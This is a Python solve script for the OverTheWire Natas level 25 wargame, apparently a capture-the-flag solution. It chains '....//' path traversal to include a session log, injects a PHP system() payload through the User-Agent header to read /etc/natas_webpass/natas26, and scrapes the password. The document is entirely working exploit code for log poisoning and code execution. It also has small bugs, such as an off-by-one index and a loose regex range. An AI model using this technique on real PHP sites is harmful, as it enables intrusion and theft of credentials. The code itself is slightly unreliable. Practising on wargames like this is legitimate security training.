import sys
import requests
import re

def get_user_password():

    url = "http://natas25.natas.labs.overthewire.org"

    auth=("natas25",sys.argv[1])

    session = requests.Session()

    session.cookies.set("PHPSESSID", "6")

    log_url = url + "?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_6.log"

    response = session.get(
        log_url,
        auth=auth,
        headers={
            "User-Agent": """<?php system('cat "/etc/natas_webpass/natas26"') ?>"""
        },
        timeout=10)

    pattern = re.compile(r"[a-zA-z0-9]{32}")
    match = pattern.findall(response.text)

    if match and len(match) >= 2:
        print(f"Password : {match[2]}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage python.py <file.py> natas_password")
    get_user_password()
